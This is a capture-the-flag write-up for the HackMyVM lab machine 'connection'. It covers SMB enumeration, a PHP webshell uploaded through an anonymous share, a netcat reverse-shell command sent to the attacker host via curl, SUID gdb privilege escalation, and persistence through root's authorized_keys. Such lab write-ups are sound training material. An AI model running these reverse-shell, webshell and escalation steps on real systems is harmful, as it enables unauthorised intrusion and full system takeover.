# connection

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| connection | whitecr0wz | Beginner | HackMyVM |

**Summary:** Connection is a beginner-level machine that demonstrates a classic misconfiguration scenario involving shared resources. The attack begins with network reconnaissance revealing exposed services including SMB and HTTP. Exploitation leverages an anonymous SMB share that maps directly to the web server's document root, allowing for the upload of a malicious PHP script. Initial access is gained by triggering this script to execute a reverse shell. Privilege escalation is achieved by identifying a misconfigured SUID binary, `gdb`, and utilizing it to spawn a root shell, securing full control over the system.

---

## Reconnaissance

The initial phase involved identifying the target IP and scanning for open ports. A ping sweep confirmed the target was up at `192.168.100.182`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.182 08:00:27:FF:81:AF VirtualBox
```

A comprehensive Nmap scan was performed to detect running services and versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ nmap -sC -sV -p- -T4 192.168.100.182
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 12:49 WIB
Nmap scan report for 192.168.100.182
Host is up (0.0056s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2026-02-18T00:49:48-05:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2026-02-18T05:49:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.31 seconds
```

Visiting port 80 revealed the default Apache Debian page.

![](image.png)

## Initial Access

### SMB Enumeration
Given the presence of ports 139 and 445, SMB shares were enumerated. Anonymous login was successful, revealing a share named `share`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ smbclient -L //192.168.100.182/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Private Share for uploading files)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            CONNECTION
```

Exploring the `share` directory revealed an `html` folder containing an `index.html` file. This structure strongly suggested that this share was connected to the web server's document root.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ smbclient //192.168.100.182/share -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 23 08:48:39 2020
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  html                                D        0  Wed Sep 23 09:20:00 2020

                7158264 blocks of size 1024. 5463140 blocks available
smb: \> cd html
smb: \html\> ls
  .                                   D        0  Wed Sep 23 09:20:00 2020
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  index.html                          N    10701  Wed Sep 23 08:48:45 2020

                7158264 blocks of size 1024. 5463140 blocks available
smb: \html\> get index.html
getting file \html\index.html of size 10701 as index.html (1161.1 KiloBytes/sec) (average 1161.1 KiloBytes/sec)
```

### Remote Code Execution (RCE)
To verify the connection between the SMB share and the web server, a simple PHP shell was created.

![](image-1.png)

This file was uploaded to the `html` directory on the SMB share.

```bash
smb: \html\> put shell.php
putting file shell.php as \html\shell.php (7.6 kB/s) (average 6.3 kB/s)
smb: \html\> ls
  .                                   D        0  Wed Feb 18 13:02:27 2026
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  index.html                          N    10701  Wed Sep 23 08:48:45 2020
  shell.php                           A       31  Wed Feb 18 13:02:27 2026

                7158264 blocks of size 1024. 5463128 blocks available
smb: \html\> exit
```

Testing the uploaded file via `curl` confirmed RCE, executing the `id` command as `www-data`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ curl "http://192.168.100.182/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Gaining a Reverse Shell
With command execution verified, a reverse shell was initiated. A Netcat listener was set up on port 4444.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The payload was executed via `curl`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ curl "http://192.168.100.182/shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash"
```

The connection was established, granting access as the `www-data` user. The shell was then stabilized.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 52305
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@connection:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@connection:/var/www/html$ export SHELL=/bin/bash
www-data@connection:/var/www/html$ export TERM=xterm
www-data@connection:/var/www/html$ stty rows 50 cols 200
www-data@connection:/var/www/html$ reset
```

## Privilege Escalation

Enumeration of users on the system showed `root` and `connection`.

```bash
www-data@connection:/var$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
connection:x:1000:1000:connection,,,:/home/connection:/bin/bash
```

Access to the `connection` user's home directory allowed for the retrieval of `local.txt`.

```bash
www-data@connection:/var$ ls -la /home/connection/
total 28
drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .
drwxr-xr-x 3 root       root       4096 Sep 22  2020 ..
lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .bash_history -> /dev/null
-rw-r--r-- 1 connection connection  220 Sep 22  2020 .bash_logout
-rw-r--r-- 1 connection connection 3526 Sep 22  2020 .bashrc
drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .local
lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .mysql_history -> /dev/null
-rw-r--r-- 1 connection connection  807 Sep 22  2020 .profile
-rw-r--r-- 1 connection connection   33 Sep 22  2020 local.txt
```

### SUID Binary Enumeration
A search for files with the SUID bit set revealed several binaries. One stood out: `/usr/bin/gdb`.

```bash
www-data@connection:/home/connection$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
...
-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb
...
```

### Exploiting GDB
Reference to GTFOBins confirmed that `gdb` with SUID permissions can be abused to escalate privileges.

![](image-2.png)

Using the technique described, privileges were escalated to root.

```bash
www-data@connection:/home/connection$ gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
...
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

### Persistence
To maintain access, an SSH key was generated on the attacking machine and added to the root user's `authorized_keys` file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ ssh-keygen -t rsa -N "" -f id_rsa_root
...
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ cat id_rsa_root.pub
ssh-rsa AAAAB3Nza... ouba@CLIENT-DESKTOP
```

On the target machine:

```bash
bash-5.0# mkdir .ssh
bash-5.0# ssh-rsa AAAAB3Nza... ouba@CLIENT-DESKTOP > .ssh/authorized_keys
bash-5.0# chmod 600 .ssh/authorized_keys
```

Finally, logging in as root via SSH was successful, and the flags were retrieved.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/connection]
└─$ ssh -i id_rsa_root root@192.168.100.182
...
root@connection:~# id
uid=0(root) gid=0(root) groups=0(root)
root@connection:~# grep "" /root/proof.txt /home/connection/local.txt
/root/proof.txt:a7c[REDACTED]
/home/connection/local.txt:3f4[REDACTED]
```

---

## Attack Chain Summary
1.  **Reconnaissance**: Nmap scan revealed ports 22 (SSH), 80 (HTTP), and 139/445 (SMB).
2.  **Vulnerability Discovery**: Found an anonymous SMB share `share` that was writable and mapped to the web root `/var/www/html`.
3.  **Exploitation**: Uploaded a PHP webshell (`shell.php`) via SMB and executed it via HTTP to gain Remote Code Execution (RCE).
4.  **Internal Enumeration**: Established a reverse shell as `www-data` and identified SUID binaries on the system.
5.  **Privilege Escalation**: Exploited the SUID-enabled `gdb` binary using a known GTFOBins technique to spawn a root shell.
